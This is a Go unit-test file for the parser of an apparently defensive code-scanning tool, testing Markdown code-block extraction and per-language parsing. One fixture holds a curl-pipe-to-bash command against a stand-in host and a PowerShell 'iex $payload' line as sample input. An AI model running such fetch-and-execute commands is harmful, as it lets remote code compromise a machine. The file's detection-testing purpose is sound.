package parser

import (
	"strings"
	"testing"

	"github.com/dorgrn/decloak/internal/model"
)

func TestExtractEmbeddedCodeBlocks(t *testing.T) {
	src := []byte("# Title\n\n```ts\nconst x = 1;\n```\n\n```tsx\nconst View = () => <div />;\n```\n\n```python\nprint(1)\n```\n\n```bash\ncurl -fsSL https://example.invalid/x.sh | bash\n```\n\n```powershell\niex $payload\n```\n")
	lang, err := LanguageFor(model.LangMarkdown)
	if err != nil {
		t.Fatalf("LanguageFor: %v", err)
	}
	tree, _, err := NewWorkerParsers().Parse(model.LangMarkdown, src)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}

	blocks, err := ExtractEmbeddedCodeBlocks(tree.RootNode(), lang, src)
	if err != nil {
		t.Fatalf("ExtractEmbeddedCodeBlocks: %v", err)
	}
	if len(blocks) != 5 {
		t.Fatalf("got %d blocks, want 5", len(blocks))
	}

	if blocks[0].Language != model.LangTypeScript {
		t.Errorf("block 0 language = %q, want %q", blocks[0].Language, model.LangTypeScript)
	}
	if got := strings.TrimSpace(string(blocks[0].Content)); got != "const x = 1;" {
		t.Errorf("block 0 content = %q", got)
	}
	if blocks[1].Language != model.LangTSX {
		t.Errorf("block 1 language = %q, want %q", blocks[1].Language, model.LangTSX)
	}
	if blocks[2].Language != model.LangPython {
		t.Errorf("block 2 language = %q, want %q", blocks[2].Language, model.LangPython)
	}
	if got := strings.TrimSpace(string(blocks[2].Content)); got != "print(1)" {
		t.Errorf("block 2 content = %q", got)
	}
	if blocks[3].Language != model.LangShell {
		t.Errorf("block 3 language = %q, want %q", blocks[3].Language, model.LangShell)
	}
	if blocks[4].Language != model.LangPowerShell {
		t.Errorf("block 4 language = %q, want %q", blocks[4].Language, model.LangPowerShell)
	}
}

func TestLanguageForSupportedLanguages(t *testing.T) {
	langs := []model.Language{
		model.LangMarkdown, model.LangPython, model.LangJavaScript, model.LangTypeScript,
		model.LangTSX, model.LangShell, model.LangPowerShell,
	}
	for _, lang := range langs {
		t.Run(string(lang), func(t *testing.T) {
			got, err := LanguageFor(lang)
			if err != nil {
				t.Fatalf("LanguageFor(%q): %v", lang, err)
			}
			if got == nil {
				t.Fatalf("LanguageFor(%q) returned a nil language", lang)
			}
			again, _ := LanguageFor(lang)
			if again != got {
				t.Errorf("LanguageFor(%q) is not a stable singleton", lang)
			}
		})
	}
}

func TestLanguageForUnknownLanguageReturnsError(t *testing.T) {
	for _, lang := range []model.Language{"", "cobol"} {
		got, err := LanguageFor(lang)
		if err == nil || got != nil {
			t.Errorf("LanguageFor(%q) = (%v, %v), want (nil, error)", lang, got, err)
		}
	}
}

func TestParseProducesTreeForEachLanguage(t *testing.T) {
	tests := []struct {
		lang model.Language
		src  string
	}{
		{model.LangMarkdown, "# Title\n\nbody\n"},
		{model.LangPython, "print('hi')\n"},
		{model.LangJavaScript, "const x = 1;\n"},
		{model.LangTypeScript, "const x: number = 1;\n"},
		{model.LangTSX, "const V = () => <div />;\n"},
		{model.LangShell, "echo hi\n"},
		{model.LangPowerShell, "Write-Host 'hi'\n"},
	}
	wp := NewWorkerParsers()
	for _, tt := range tests {
		t.Run(string(tt.lang), func(t *testing.T) {
			tree, lang, err := wp.Parse(tt.lang, []byte(tt.src))
			if err != nil {
				t.Fatalf("Parse: %v", err)
			}
			if tree == nil || tree.RootNode() == nil {
				t.Fatal("Parse returned no tree")
			}
			want, _ := LanguageFor(tt.lang)
			if lang != want {
				t.Errorf("Parse returned language %p, want the LanguageFor singleton %p", lang, want)
			}
		})
	}
}

func TestParseEmptySourceSucceeds(t *testing.T) {
	tree, _, err := NewWorkerParsers().Parse(model.LangPython, nil)
	if err != nil {
		t.Fatalf("Parse(nil): %v", err)
	}
	if tree == nil {
		t.Fatal("Parse(nil) returned no tree")
	}
}

func TestParseUnknownLanguageReturnsError(t *testing.T) {
	tree, lang, err := NewWorkerParsers().Parse("cobol", []byte("DISPLAY 'x'."))
	if err == nil {
		t.Fatal("Parse of an unknown language returned nil error")
	}
	if tree != nil || lang != nil {
		t.Errorf("Parse returned (%v, %v), want nil tree and language", tree, lang)
	}
}
